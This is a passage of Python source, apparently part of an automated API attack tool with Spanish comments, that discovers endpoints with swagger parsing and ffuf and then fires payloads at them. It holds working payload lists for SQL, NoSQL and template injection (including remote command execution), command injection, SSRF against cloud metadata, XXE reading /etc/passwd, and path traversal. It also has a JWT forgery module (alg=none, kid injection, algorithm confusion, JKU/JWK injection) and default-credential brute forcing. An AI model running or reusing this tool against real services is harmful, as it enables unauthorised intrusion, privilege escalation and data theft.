                    self.state.discovered_endpoints.add(path)
                print(f"[+] Swagger cargado exitosamente: {len(swagger_endpoints)} endpoints")
            else:
                print("[-] Falló carga de swagger, cambiando a modo discovery")
                self.state.swagger_mode = False
                self._add_common_endpoints()
        else:
            # Step 1: Descubrir documentación (swagger/openapi)
            self._add_common_endpoints()
            for path in self.swagger_paths:
                url = f"{self.host}{path}"
                result = self.curl(url, timeout=10)
                if not result:
                    break
                
                response_text = result.stdout + "\n" + result.stderr
                lower_text = response_text.lower()
                body = self.extract_http_body(result.stdout)
                
                # Log en discovered-docs
                found = result.status_code == 200
                self.doc_logger.log_doc(path, url, result.status_code, "text/html", found)
                
                if result.returncode == 0:
                    try:
                        data = json.loads(body)
                        if isinstance(data, dict):
                            for key in ["paths", "endpoints", "routes", "apis"]:
                                if key in data:
                                    endpoints = data[key]
                                    if isinstance(endpoints, dict):
                                        for ep in endpoints.keys():
                                            self.state.discovered_endpoints.add(ep)
                                            print(f"  [+] Endpoint encontrado en swagger: {ep}")
                                    elif isinstance(endpoints, list):
                                        for ep in endpoints:
                                            if isinstance(ep, str):
                                                self.state.discovered_endpoints.add(ep)
                                                print(f"  [+] Endpoint encontrado en swagger: {ep}")
                            
                            if "status" in data:
                                print(f"  [*] Status field: {data['status']}")
                            if "flag" in data:
                                print(f"  [*] Flag field: {data['flag']}")
                    except Exception:
                        pass
                    
                    if "swagger" in body.lower() or "openapi" in body.lower():
                        self.state.discovered_docs.append(url)
                        print(f"  [+] Doc encontrada: {path}")
            
            # Step 2: Fuzzing con ffuf para descubrir múltiples cosas
            print("\n[*] Fase 2: Fuzzing con ffuf...")
            self._ffuf_discover_endpoints()
            self._ffuf_discover_parameters()
            
            # Step 3: Endpoints comunes
            self._add_common_endpoints()
        
        # Step 4: GraphQL discovery
        print("\n[*] Fase 2a: Buscando endpoint GraphQL...")
        graphql_ep = self._discover_graphql_endpoint()
        if graphql_ep:
            print(f"\n[*] Ejecutando introspección GraphQL...")
            self._execute_graphql_introspection(graphql_ep)
        
        # Step 5: SOAP/WSDL probe
        print("\n[*] Fase 2b: Buscando SOAP/WSDL...")
        self._attack_soap_wsdl("/")
        
        # Step 6: Version fuzzing
        print("\n[*] Fase 2d: Version fuzzing...")
        if not self.state.swagger_mode:
            versions = ["/v1", "/v2", "/v3", "/v0", "/beta", "/dev", "/staging"]
            for v in versions:
                for base in ["/api", ""]:
                    candidate = f"{base}{v}"
                    if candidate not in self.state.discovered_endpoints:
                        self.state.discovered_endpoints.add(candidate)
                        print(f"  [+] Version candidato: {candidate}")
        
        # Step 7: Verb fuzzing (solo en modo discovery)
        print("\n[*] Fase 2e: Verb fuzzing...")
        if not self.state.swagger_mode:
            verbs = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]
            for ep in list(self.state.discovered_endpoints):
                if ep and ep != "/":
                    for verb in verbs:
                        candidate = f"{ep}#{verb}"  # Marca interna para tracking
                        # Probará verbos en _filter_valid_endpoints mediante el endpoint original
                        pass  # Se manejará en _filter_valid_endpoints con verbo fuzzing
        
        print(f"\n[+] Total endpoints candidatos: {len(self.state.discovered_endpoints)}")
        
        # Step 8: Filtrar endpoints válidos (solo test sin payloads)
        print("\n[*] Fase 3: Filtrando endpoints válidos...")
        self._filter_valid_endpoints()
        
        print(f"[+] Total endpoints válidos: {len(self.state.valid_endpoints)}")
    
    def _ffuf_discover_endpoints(self) -> None:
        """Descubrir rutas con ffuf"""
        if os.path.exists(self.wordlists["endpoints"]):
            ffuf_cmd = [
                "ffuf", "-u", f"{self.host}/FUZZ", "-w", self.wordlists["endpoints"],
                "-mc", "200,201,202,204,301,302,401,403", "-c", "-of", "json", "-s",
                "-t", "10"
            ]
            result = self.run_cmd("ffuf-endpoints", ffuf_cmd, timeout=60)
            try:
                output_lines = result.stdout.strip().split('\n')
                for line in output_lines[-1:]:
                    if line.startswith('{'):
                        data = json.loads(line)
                        if "results" in data:
                            for item in data["results"]:
                                endpoint = item.get("input", {}).get("FUZZ", "")
                                if endpoint:
                                    self.state.discovered_endpoints.add(f"/{endpoint}")
                                    print(f"  [+] ffuf: /{endpoint}")
            except Exception:
                pass
    
    def _ffuf_discover_parameters(self) -> None:
        """Descubrir parámetros GET/POST con ffuf"""
        if not os.path.exists(self.wordlists["parameters"]):
            return
        
        # Fuzzing de parámetros GET contra /api
        if "/api" in self.state.discovered_endpoints:
            print("  [*] Fuzzing parámetros GET en /api...")
            ffuf_cmd = [
                "ffuf", "-u", f"{self.host}/api?FUZZ=test", "-w", self.wordlists["parameters"],
                "-mc", "200,201,301,302", "-c", "-of", "json", "-s", "-t", "10"
            ]
            result = self.run_cmd("ffuf-parameters-get", ffuf_cmd, timeout=60)
            try:
                output_lines = result.stdout.strip().split('\n')
                for line in output_lines[-1:]:
                    if line.startswith('{'):
                        data = json.loads(line)
                        if "results" in data and data["results"]:
                            print(f"  [+] ffuf: Parámetros GET encontrados en /api")
            except Exception:
                pass
    
    def _filter_valid_endpoints(self) -> None:
        """Test cada endpoint descubierto y mantener solo los válidos (2xx/3xx)"""
        valid_status = [200, 201, 202, 204, 301, 302, 303]
        
        if self.state.swagger_mode:
            # Modo swagger: filtrar endpoints del swagger
            endpoints_to_test = list(self.state.swagger_endpoints.keys())
        else:
            # Modo discovery: filtrar endpoints descubiertos
            endpoints_to_test = list(self.state.discovered_endpoints)
        
        for endpoint in sorted(endpoints_to_test):
            if self.requests_executed >= 300:
                print(f"[!] Límite de 300 requests alcanzado durante filtrado")
                break
            
            if not endpoint or endpoint == "/":
                # Root siempre se considera válido
                self.state.valid_endpoints.add(endpoint)
                continue
            
            full_url = f"{self.host}{endpoint}"
            result = self.curl(full_url, timeout=5)
            
            if result and result.status_code in valid_status:
                self.state.valid_endpoints.add(endpoint)
                print(f"  [✓] {endpoint} → {result.status_code}")
            else:
                status = result.status_code if result else "no-response"
                print(f"  [✗] {endpoint} → {status} (ignorado)")
        
        # Verb fuzzing: probar métodos adicionales en endpoints válidos
        if not self.state.swagger_mode:
            print("\n[*] Verb fuzzing: probando métodos HTTP alternativos...")
            verbs = ["POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]
            for endpoint in sorted(list(self.state.valid_endpoints)):
                if not endpoint or endpoint == "/":
                    continue
                full_url = f"{self.host}{endpoint}"
                for verb in verbs:
                    if self.requests_executed >= 300:
                        break
                    result = self.curl(full_url, method=verb, timeout=5)
                    if result and result.status_code in valid_status:
                        if endpoint not in self.state.valid_endpoints:
                            self.state.valid_endpoints.add(endpoint)
                            print(f"  [✓] {endpoint} → {result.status_code} ({verb})")


    def execute_payloads_on_endpoints(self) -> None:
        print("\n[*] Fase 3: Ejecutando payloads en endpoints válidos...")
        
        if not self.state.valid_endpoints:
            print("[-] No se encontraron endpoints válidos para atacar")
            return
        
        if self.state.swagger_mode:
            # Modo swagger: payloads dirigidos con concurrencia
            self._execute_swagger_payloads()
        else:
            # Modo discovery: payloads genéricos expandidos
            self._execute_generic_payloads()
        
        # === Attack Engine: ejecutar todos los módulos de ataque ===
        print("\n[*] Fase 3b: Ejecutando módulos de ataque especializados...")
        
        for endpoint in sorted(self.state.valid_endpoints):
            if not endpoint:
                continue
            full_url = f"{self.host}{endpoint}"
            
            with self.lock:
                if self.requests_executed >= 290:
                    print(f"\n[!] Budget casi agotado, saltando ataques restantes")
                    break
            
            # Authentication: JWT attacks
            self._attack_auth_jwt(endpoint, full_url)
            
            # Authentication: brute force en login endpoints
            self._attack_auth_bruteforce(endpoint, full_url)
            
            # Authentication: password reset abuse
            self._attack_auth_password_reset(endpoint, full_url)
            
            # Authorization: IDOR, BFLA, Tenant breakout
            self._attack_authorization(endpoint, full_url)
            
            # Business logic: negative values, nulls
            self._attack_business_logic(endpoint, full_url)
            
            # SSRF port scan
            self._attack_ssrf_portscan(endpoint, full_url)
            
            # File upload
            self._attack_file_upload(endpoint, full_url)
            
            # CORS origin reflection
            self._attack_cors(endpoint, full_url)
            
            # Verbose errors
            self._attack_verbose_errors(endpoint, full_url)
        
        # HTTP Request Smuggling (CL.TE / TE.CL)
        print("\n[*] Fase 3c: Detectando HTTP Request Smuggling...")
        self._attack_smuggling("/")
        
        # SOAP/WSDL discovery (una vez, independiente de endpoint)
        print("\n[*] Fase 3d: Descubriendo SOAP/WSDL...")
        self._attack_soap_wsdl("/")
        
        # Always try GraphQL introspection if endpoint wasn't found earlier
        if not self.state.graphql_schema:
            for ep in sorted(self.state.valid_endpoints):
                if 'graphql' in ep.lower() or 'graph' in ep.lower() or 'gql' in ep.lower():
                    self._execute_graphql_introspection(ep)
    
    def _execute_swagger_payloads(self) -> None:
        """Ejecuta payloads dirigidos basados en metadata Swagger (concurrente)"""
        print(f"[*] Atacando {len(self.state.valid_endpoints)} endpoints del swagger...")
        
        def _attack_endpoint(endpoint: str):
            if endpoint not in self.state.swagger_endpoints:
                return
            swagger_ep = self.state.swagger_endpoints[endpoint]
            full_url = f"{self.host}{endpoint}"
            
            for method_name, method_obj in swagger_ep.methods.items():
                if method_name == "GET":
                    self._execute_get_payloads(endpoint, method_obj)
                elif method_name in ["POST", "PUT"]:
                    self._execute_body_payloads(endpoint, method_obj, method_name)
                elif method_name == "DELETE":
                    self._execute_delete_payloads(endpoint, method_obj)
        
        endpoints = sorted(self.state.valid_endpoints)
        if self.concurrency > 1 and len(endpoints) > 1:
            with ThreadPoolExecutor(max_workers=self.concurrency) as executor:
                futures = {executor.submit(_attack_endpoint, ep): ep for ep in endpoints}
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception:
                        pass
        else:
            for ep in endpoints:
                _attack_endpoint(ep)
    
    def _execute_get_payloads(self, endpoint: str, method_obj: SwaggerMethod) -> None:
        """Ejecuta GET con parámetros query del swagger"""
        full_url = f"{self.host}{endpoint}"
        
        # Extraer parámetros query
        query_params = [p for p in method_obj.parameters if p.in_location == "query"]
        
        if not query_params:
            # Sin parámetros, un GET simple
            result = self.curl(full_url, method="GET", timeout=10)
            if result:
                self._record_attack(endpoint, "GET", {}, result)
        else:
            # Con parámetros, generar payloads para cada parámetro
            for param in query_params:
                payloads = self._generate_payloads_from_schema(param.schema, param.name)
                for payload in payloads:
                    if self.requests_executed >= 300:
                        return
                    
                    query_string = f"{param.name}={payload}" if not isinstance(payload, dict) else json.dumps({param.name: payload})
                    url = f"{full_url}?{query_string}"
                    result = self.curl(url, method="GET", timeout=10)
                    if result:
                        self._record_attack(endpoint, "GET", {param.name: payload}, result)
    
    def _execute_body_payloads(self, endpoint: str, method_obj: SwaggerMethod, method: str) -> None:
        """Ejecuta POST/PUT con body JSON basado en el request schema del swagger"""
        full_url = f"{self.host}{endpoint}"
        
        if not method_obj.request_body:
            # Sin request body definido, enviar vacío
            result = self.curl(
                full_url,
                method=method,
                headers={"Content-Type": "application/json"},
                data=json.dumps({}),
                timeout=10
            )
            if result:
                self._record_attack(endpoint, method, {}, result)
        else:
            # Extraer propiedades del request body schema
            request_schema = method_obj.request_body
            properties = request_schema.get("properties", {})
            
            if not properties:
                # Si no hay propiedades definidas, enviar objeto vacío
                result = self.curl(
                    full_url,
                    method=method,
                    headers={"Content-Type": "application/json"},
                    data=json.dumps({}),
                    timeout=10
                )
                if result:
                    self._record_attack(endpoint, method, {}, result)
            else:
                # Generar payloads para cada propiedad
                for prop_name, prop_schema in properties.items():
                    payloads = self._generate_payloads_from_schema(prop_schema, prop_name)
                    for payload in payloads:
                        if self.requests_executed >= 300:
                            return
                        
                        # Crear payload JSON con esta propiedad
                        body_dict = {prop_name: payload}
                        data = json.dumps(body_dict)
                        
                        result = self.curl(
                            full_url,
                            method=method,
                            headers={"Content-Type": "application/json"},
                            data=data,
                            timeout=10
                        )
                        if result:
                            self._record_attack(endpoint, method, body_dict, result)
    
    def _execute_delete_payloads(self, endpoint: str, method_obj: SwaggerMethod) -> None:
        """Ejecuta DELETE simple"""
        full_url = f"{self.host}{endpoint}"
        
        result = self.curl(full_url, method="DELETE", timeout=10)
        if result:
            self._record_attack(endpoint, "DELETE", {}, result)
    
    def _execute_generic_payloads(self) -> None:
        """Ejecuta payloads genéricos expandidos (modo discovery)"""
        ssti_payloads = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"]
        ssti_rce = ["{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                     "${7*7}"]
        sqli_payloads = ["admin' OR '1'='1", "admin' --", "' OR 1=1--", "admin'/*"]
        blind_sqli = ["'; pg_sleep(3)--", "' AND SLEEP(3)--", "'; WAITFOR DELAY '0:0:3'--"]
        command_injection = ["; id", "| whoami", "&& id", "`id`", "$(id)"]
        ssrf_payloads = ["http://169.254.169.254/latest/meta-data/",
                         "http://127.0.0.1:80",
                         "http://localhost:8080",
                         "http://[::]:80/",
                         "http://0.0.0.0:80/"]
        nosql_payloads = [{"$ne": None}, {"$gt": ""}, {"$regex": "^admin"}]
        path_traversal = ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini"]
        
        payloads = {
            "GET": [
                {},
                {"query": "admin' OR '1'='1"},
                {"id": "1' OR '1'='1"},
                {"search": "admin' OR '1'='1"},
                {"name": "{{7*7}}"},
                {"name": "${7*7}"},
                {"search": "'; pg_sleep(3)--"},
                {"id": "' AND SLEEP(3)--"},
                {"file": "; id"},
                {"file": "| whoami"},
                {"url": "http://169.254.169.254/latest/meta-data/"},
                {"url": "http://127.0.0.1:80"},
                {"debug": "true"},
                {"admin": "true"},
                {"test": "1"},
                {"name": "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}"},
            ],
            "POST": [
                {"username": "admin", "password": "admin"},
                {"username": "admin", "password": "password"},
                {"username": "admin' OR '1'='1", "password": "x"},
                {"username": "admin", "password": {"$ne": None}},
                {"username": {"$ne": None}, "password": {"$ne": None}},
                {"query": "admin' OR '1'='1"},
                {"query": {"$ne": None}},
                {"search": "{{7*7}}"},
                {"search": "${7*7}"},
                {"search": "'; pg_sleep(3)--"},
                {"username": "admin' AND SLEEP(3)--", "password": "x"},
                {"search": "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}"},
                {"email": "test@test.com", "name": "Test", "is_admin": True, "role": "admin"},
                {"amount": -5000},
                {"role": "admin", "is_admin": True, "privileges": ["all", "root"]},
                {"url": "http://169.254.169.254/latest/meta-data/"},
                {"url": "http://127.0.0.1:80"},
                {"filename": "../../../etc/passwd"},
                {"file": "../../../etc/passwd"},
            ],
            "PUT": [
                {"email": "test@test.com", "name": "Test", "is_admin": True, "role": "admin"},
                {"role": "admin", "is_admin": True, "privileges": ["all", "root"]},
                {"amount": -5000},
                {"price": 0.01},
                {"search": "'; pg_sleep(3)--"},
                {"name": "{{7*7}}"},
            ],
            "DELETE": [{}, {}],
        }
        
        # XXE payloads for Content-Type confusion
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><name>&xxe;</name></root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root><name>&xxe;</name></root>',
        ]
        
        # Method override headers
        override_headers = [
            {"X-HTTP-Method-Override": "PUT"},
            {"X-HTTP-Method-Override": "DELETE"},
            {"X-HTTP-Method-Override": "POST"},
            {"X-Original-URL": "/api/v1/admin"},
            {"X-Rewrite-URL": "/api/v1/admin"},
        ]
        
        # HPP: duplicate parameter payloads
        hpp_payloads = [
            "id=1&id=2",
            "email=admin@target.com&email=attacker@evil.com",
            "amount=1000&to_user=attacker&to_user=victim",
        ]
        
        print(f"[*] Atacando {len(self.state.valid_endpoints)} endpoints genéricos...")
        total_planned = len(self.state.valid_endpoints) * (
            sum(len(v) for v in payloads.values()) + len(xxe_payloads) + len(override_headers) + len(hpp_payloads)
        )
        done = 0
        
        for endpoint in sorted(self.state.valid_endpoints):
            if not endpoint or endpoint == "/":
                continue
            
            full_url = f"{self.host}{endpoint}"
            
            for method in ["GET", "POST", "PUT", "DELETE"]:
                method_payloads = payloads.get(method, [])
                
                for payload_dict in method_payloads:
                    with self.lock:
                        if self.requests_executed >= 300:
                            print(f"\n[!] Límite de 300 requests alcanzado")
                            return
                    
                    if method == "GET":
                        if payload_dict:
                            query_params = "&".join([f"{k}={v}" for k, v in payload_dict.items()])
                            url = f"{full_url}?{query_params}"
                        else:
                            url = full_url
                        result = self.curl(url, method=method, timeout=10)
                    else:
                        if payload_dict:
                            data = json.dumps(payload_dict)
                        else:
                            data = None
                        result = self.curl(full_url, method=method,
                                           headers={"Content-Type": "application/json"},
                                           data=data, timeout=10)
                    
                    if result:
                        self._record_attack(endpoint, method, payload_dict if payload_dict else {}, result)
                    
                    done += 1
                    if done % 5 == 0:
                        print(f"  [*] Progreso: {done}/{total_planned} ataques", end="\r")
            
            # Content-Type confusion: try XML payloads on POST endpoints
            for xxe_payload in xxe_payloads:
                with self.lock:
                    if self.requests_executed >= 300:
                        return
                result = self.curl(full_url, method="POST",
                                   headers={"Content-Type": "application/xml"},
                                   data=xxe_payload, timeout=10)
                if result:
                    self._record_attack(endpoint, "POST", {"content-type": "xml", "xxe": True}, result)
                done += 1
            
            # Method override header attacks
            for override_hdr in override_headers:
                with self.lock:
                    if self.requests_executed >= 300:
                        return
                result = self.curl(full_url, method="GET",
                                   headers=override_hdr, timeout=10)
                if result:
                    self._record_attack(endpoint, "OVERRIDE", override_hdr, result)
                done += 1
            
            # HPP: parameter pollution
            for hpp_param_str in hpp_payloads:
                with self.lock:
                    if self.requests_executed >= 300:
                        return
                url = f"{full_url}?{hpp_param_str}"
                result = self.curl(url, method="GET", timeout=10)
                if result:
                    self._record_attack(endpoint, "HPP", {"hpp": hpp_param_str}, result)
                done += 1
        
        print(f"\n  [+] Ataques completados: {done}")
    
    @staticmethod
    def _b64_encode(data: str) -> str:
        """Base64 URL-safe sin padding"""
        return base64.urlsafe_b64encode(data.encode()).rstrip(b'=').decode()
    
    @staticmethod
    def _b64_decode(data: str) -> str:
        """Decodifica Base64 URL-safe con padding automático"""
        padding = 4 - len(data) % 4
        if padding != 4:
            data += '=' * padding
        return base64.urlsafe_b64decode(data).decode(errors='replace')
    
    @staticmethod
    def _hmac_sign(header_b64: str, payload_b64: str, secret: bytes, alg: str = "HS256") -> str:
        """Firma HMAC-SHA256 para JWT (sin librerías externas)"""
        if alg == "HS256":
            sig = hmac.new(secret, f"{header_b64}.{payload_b64}".encode(), hashlib.sha256).digest()
        elif alg == "HS384":
            sig = hmac.new(secret, f"{header_b64}.{payload_b64}".encode(), hashlib.sha384).digest()
        elif alg == "HS512":
            sig = hmac.new(secret, f"{header_b64}.{payload_b64}".encode(), hashlib.sha512).digest()
        else:
            sig = hmac.new(secret, f"{header_b64}.{payload_b64}".encode(), hashlib.sha256).digest()
        return base64.urlsafe_b64encode(sig).rstrip(b'=').decode()

    def _attack_auth_jwt(self, endpoint: str, full_url: str) -> None:
        """Ataques JWT completos: alg=none, kid, algorithm confusion, JWK, JKU, signature bypass, exp bypass, aud/iss manipulation"""
        if not self.credentials:
            return
        with self.lock:
            if self.requests_executed >= 285:
                return
        
        # Extraer el JWT actual
        jwt_token = self.credentials.replace("Bearer ", "")
        if not jwt_token.startswith("eyJ"):
            return
        
        try:
            parts = jwt_token.split('.')
            current_header_b64 = parts[0]
            current_payload_b64 = parts[1]
            current_sig_b64 = parts[2] if len(parts) > 2 else ""
            
            current_header = json.loads(self._b64_decode(current_header_b64))
            current_payload = json.loads(self._b64_decode(current_payload_b64))
        except Exception:
            return
        
        # Forzar payload admin
        admin_payload = dict(current_payload)
        admin_payload.update({"role": "admin", "is_admin": True, "sub": "admin"})
        
        # ============================================================
        # Attack 1: alg=none (4 variantes)
        # ============================================================
        for alg_variant in ["none", "None", "NONE", "nOnE", "null", "Null"]:
            with self.lock:
                if self.requests_executed >= 300:
                    return
            header_none = self._b64_encode(json.dumps({"alg": alg_variant, "typ": "JWT"}))
            payload_b64 = self._b64_encode(json.dumps(admin_payload))
            forged = f"{header_none}.{payload_b64}."
            result = self.curl(full_url, method="GET",
                               headers={"Authorization": f"Bearer {forged}"}, timeout=10)
            if result:
                self._record_attack(endpoint, "JWT-alg-none", {"alg": alg_variant, "payload": admin_payload}, result)
        
        # ============================================================
        # Attack 2: kid injection (path traversal + SQLi)
        # ============================================================
        kid_payloads = [
            {"alg": "HS256", "typ": "JWT", "kid": "../../../dev/null"},
            {"alg": "HS256", "typ": "JWT", "kid": "../../../etc/passwd"},
            {"alg": "HS256", "typ": "JWT", "kid": "/proc/sys/kernel/random/uuid"},
            {"alg": "HS256", "typ": "JWT", "kid": "1' UNION SELECT 'secret'--"},
            {"alg": "HS256", "typ": "JWT", "kid": "1' UNION SELECT 'public'--"},
            {"alg": "HS256", "typ": "JWT", "kid": "keyfile"},
            {"alg": "HS256", "typ": "JWT", "kid": ""},
        ]
        for kid_header in kid_payloads:
            with self.lock:
                if self.requests_executed >= 300:
                    return
            # Firmar con el kid value como HMAC secret
            kid_secret = kid_header["kid"].encode()
            hdr_b64 = self._b64_encode(json.dumps(kid_header))
            pay_b64 = self._b64_encode(json.dumps(admin_payload))
            sig = self._hmac_sign(hdr_b64, pay_b64, kid_secret)
            forged = f"{hdr_b64}.{pay_b64}.{sig}"
            result = self.curl(full_url, method="GET",
                               headers={"Authorization": f"Bearer {forged}"}, timeout=10)
            if result:
                self._record_attack(endpoint, "JWT-kid", {"kid": kid_header["kid"]}, result)
        
        # ============================================================
        # Attack 3: Algorithm Confusion RS256→HS256
        # ============================================================
        current_alg = current_header.get("alg", "").upper()
        if current_alg == "RS256":
            # Try to discover public key
            jwks_paths = ["/.well-known/jwks.json", "/jwks.json", "/api/jwks",
                          "/.well-known/openid-configuration", "/openid-configuration"]
            public_key_pem = None
            for jwks_path in jwks_paths:
                with self.lock:
                    if self.requests_executed >= 295:
                        break
                jwks_url = f"{self.host}{jwks_path}"
                result = self.curl(jwks_url, timeout=10)
                if result and result.status_code == 200:
                    body = self.extract_http_body(result.stdout)
                    try:
                        jwks_data = json.loads(body)
                        if "keys" in jwks_data:
                            # Found JWKS - try to use the modulus(n) as HMAC secret
                            # For algorithm confusion, the public key PEM or its raw bytes are used
                            for key in jwks_data["keys"]:
                                if key.get("kty") == "RSA" and "n" in key:
                                    # Use base64-decoded modulus as HMAC secret
                                    n_bytes = base64.urlsafe_b64decode(key["n"] + "==")
                                    hdr = self._b64_encode(json.dumps({"alg": "HS256", "typ": "JWT"}))
                                    pay = self._b64_encode(json.dumps(admin_payload))
                                    sig = self._hmac_sign(hdr, pay, n_bytes)
                                    forged = f"{hdr}.{pay}.{sig}"
                                    r = self.curl(full_url, method="GET",
                                                  headers={"Authorization": f"Bearer {forged}"}, timeout=10)
                                    if r:
                                        self._record_attack(endpoint, "JWT-RS256-HS256", {"confusion": "n-as-hmac"}, r)
                                    break
                        if "issuer" in jwks_data:
                            # OpenID config - try jwks_uri
                            pass
                    except Exception:
                        pass
                    break  # Only try first successful path
        
        # Always try HS256 with trivial secrets (even if original isn't RS256)
        trivial_secrets = [b"", b"secret", b"public", b"password", b"key", admin_payload.get("sub", "admin").encode()]
        for secret in trivial_secrets:
            with self.lock:
                if self.requests_executed >= 300:
                    return
            hdr = self._b64_encode(json.dumps({"alg": "HS256", "typ": "JWT"}))
            pay = self._b64_encode(json.dumps(admin_payload))
            sig = self._hmac_sign(hdr, pay, secret)
            forged = f"{hdr}.{pay}.{sig}"
            result = self.curl(full_url, method="GET",
                               headers={"Authorization": f"Bearer {forged}"}, timeout=10)
            if result:
                self._record_attack(endpoint, "JWT-HS256-trivial", {"secret": secret.decode(errors='replace')}, result)
        
        # ============================================================
        # Attack 4: JWK Header Injection (embedded key)
        # ============================================================
        jwk_headers = [
            {"alg": "HS256", "typ": "JWT", "jwk": {"kty": "oct", "k": "AAECAwQFBgcICQoLDA0ODw"}},
            {"alg": "HS256", "typ": "JWT", "jwk": {"kty": "oct", "k": ""}},
            {"alg": "none", "typ": "JWT", "jwk": {"kty": "oct", "k": "AAEC"}},
        ]
        for jwk_hdr in jwk_headers:
            with self.lock:
                if self.requests_executed >= 300:
                    return
            hdr_b64 = self._b64_encode(json.dumps(jwk_hdr))
            pay_b64 = self._b64_encode(json.dumps(admin_payload))
            if jwk_hdr.get("alg") == "none":
                forged = f"{hdr_b64}.{pay_b64}."
            else:
                sig = self._hmac_sign(hdr_b64, pay_b64, b"AAECAwQFBgcICQoLDA0ODw")
                forged = f"{hdr_b64}.{pay_b64}.{sig}"
            result = self.curl(full_url, method="GET",
                               headers={"Authorization": f"Bearer {forged}"}, timeout=10)
            if result:
                self._record_attack(endpoint, "JWT-JWK", {"jwk": jwk_hdr["jwk"]}, result)
        
        # ============================================================
        # Attack 5: JKU Header Injection (key URL)
        # ============================================================
        jku_paths = [
            ("/jwks.json", "/jwks.json"),
            ("/.well-known/jwks.json", "/.well-known/jwks.json"),
            ("file:///dev/null", "file:///dev/null"),
            ("/api/jwks", "/api/jwks"),
        ]
        for jku_label, jku_path in jku_paths:
            with self.lock:
                if self.requests_executed >= 300:
                    return
            jku_url = f"{self.host}{jku_path}" if not jku_path.startswith("file://") else jku_path
            jku_header = {"alg": "HS256", "typ": "JWT", "jku": jku_url}
            hdr_b64 = self._b64_encode(json.dumps(jku_header))
            pay_b64 = self._b64_encode(json.dumps(admin_payload))
            sig = self._hmac_sign(hdr_b64, pay_b64, jku_path.encode())
            forged = f"{hdr_b64}.{pay_b64}.{sig}"
            result = self.curl(full_url, method="GET",
                               headers={"Authorization": f"Bearer {forged}"}, timeout=10)
            if result:
                self._record_attack(endpoint, "JWT-JKU", {"jku": jku_url}, result)
        
        # ============================================================
        # Attack 6: Signature Bypass
        # ============================================================
        # 6a: Empty / missing signature
        for sig_variant in ["", "invalid", "x", "0" * 10, "eyJpbnZhbGlkIjoiMSJ9"]:
            with self.lock:
                if self.requests_executed >= 300:
                    return
            hdr_b64 = self._b64_encode(json.dumps({"alg": current_header.get("alg", "HS256"), "typ": "JWT"}))
            pay_b64 = self._b64_encode(json.dumps(admin_payload))
            forged = f"{hdr_b64}.{pay_b64}.{sig_variant}"
            result = self.curl(full_url, method="GET",
                               headers={"Authorization": f"Bearer {forged}"}, timeout=10)
            if result:
                self._record_attack(endpoint, "JWT-sig-bypass", {"sig": sig_variant}, result)
        
        # 6b: Original signature with admin payload (reuse sig from different payload)
        if current_sig_b64:
            with self.lock:
                if self.requests_executed >= 300:
                    return
            hdr_b64 = self._b64_encode(json.dumps(current_header))
            pay_b64 = self._b64_encode(json.dumps(admin_payload))
            forged = f"{hdr_b64}.{pay_b64}.{current_sig_b64}"
            result = self.curl(full_url, method="GET",
                               headers={"Authorization": f"Bearer {forged}"}, timeout=10)
            if result:
                self._record_attack(endpoint, "JWT-sig-reuse", {"original_sig": True}, result)
        
        # ============================================================
        # Attack 7: Expiration Bypass
        # ============================================================
        exp_payloads = [
            dict(admin_payload, **{"exp": 9999999999, "nbf": 0, "iat": 0}),
            dict(admin_payload, **{"exp": 0}),  # Some servers treat 0 as no expiration
            {k: v for k, v in admin_payload.items() if k not in ["exp", "nbf", "iat"]},
            dict(admin_payload, **{"exp": 4070908800, "nbf": 0, "iat": 0}),  # year 2099
        ]
        for exp_payload in exp_payloads:
            with self.lock:
                if self.requests_executed >= 300:
                    return
            hdr_b64 = self._b64_encode(json.dumps({"alg": current_header.get("alg", "HS256"), "typ": "JWT"}))
            pay_b64 = self._b64_encode(json.dumps(exp_payload))
            sig = self._hmac_sign(hdr_b64, pay_b64, jwt_token.split('.')[-1].encode() if len(jwt_token.split('.')) > 2 else b"")
            forged = f"{hdr_b64}.{pay_b64}.{sig}"
            result = self.curl(full_url, method="GET",
                               headers={"Authorization": f"Bearer {forged}"}, timeout=10)
            if result:
                self._record_attack(endpoint, "JWT-exp-bypass", {"exp": exp_payload.get("exp", "removed")}, result)
        
        # ============================================================
        # Attack 8: Audience/Issuer Manipulation
        # ============================================================
        aud_iss_payloads = [
            dict(admin_payload, **{"aud": ""}),
            dict(admin_payload, **{"aud": None}),
            dict(admin_payload, **{"aud": ["admin", "target"]}),
            dict(admin_payload, **{"iss": self.host}),
            dict(admin_payload, **{"iss": ""}),
            dict(admin_payload, **{"iss": "admin"}),
            dict(admin_payload, **{"aud": "admin", "iss": self.host}),
        ]
        for ai_payload in aud_iss_payloads:
            with self.lock:
                if self.requests_executed >= 300:
                    return
            hdr_b64 = self._b64_encode(json.dumps({"alg": current_header.get("alg", "HS256"), "typ": "JWT"}))
            pay_b64 = self._b64_encode(json.dumps(ai_payload))
            sig = self._hmac_sign(hdr_b64, pay_b64, jwt_token.split('.')[-1].encode() if len(jwt_token.split('.')) > 2 else b"")
            forged = f"{hdr_b64}.{pay_b64}.{sig}"
            result = self.curl(full_url, method="GET",
                               headers={"Authorization": f"Bearer {forged}"}, timeout=10)
            if result:
                self._record_attack(endpoint, "JWT-aud-iss", {"aud": ai_payload.get("aud"), "iss": ai_payload.get("iss")}, result)
    
    def _attack_auth_bruteforce(self, endpoint: str, full_url: str) -> None:
        """Prueba credenciales comunes en endpoints de login"""
        if not any(x in endpoint.lower() for x in ["login", "auth", "signin", "token"]):
            return
        
        common_creds = [
            ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
            ("admin", "admin123"), ("admin", "password123"), ("admin", "letmein"),
            ("user", "user"), ("guest", "guest"), ("root", "root"), ("test", "test"),
        ]
        
        for username, password in common_creds:
            with self.lock:
                if self.requests_executed >= 295:
                    return
            body = {"username": username, "password": password, "email": f"{username}@test.com"}
            result = self.curl(full_url, method="POST",
                               headers={"Content-Type": "application/json"},
                               data=json.dumps(body), timeout=10)
            if result:
